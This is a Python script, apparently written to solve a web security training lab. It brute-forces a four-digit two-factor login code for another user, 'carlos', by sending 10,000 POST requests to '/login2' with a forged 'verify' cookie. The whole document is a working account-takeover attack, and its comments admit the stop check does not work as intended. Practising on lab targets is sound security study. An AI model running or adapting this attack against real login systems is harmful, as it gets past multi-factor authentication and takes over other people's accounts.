import requests
from requests_toolbelt.utils import dump
import sys


url = ''
session_key = ''
# not sure if this is correct approach but it worked
path= '/login2'

HEADERS = {'Host': url,
            'Cookie':'session='+session_key+'; verify=carlos',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))

http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
for i in range(10000):
    r = http.post('https://'+url+path,headers=HEADERS, data='mfa-code='+str('{0:04}'.format(i)))
    sys.stdout.write('\r'+str('{0:04}'.format(i)))
    sys.stdout.flush()
# did not stop as expected but solved the lab since i accesed profile of user carlos
# to_do fix 
    if r.status_code != 200:
        print(r.status_code)
        print(i)
        break
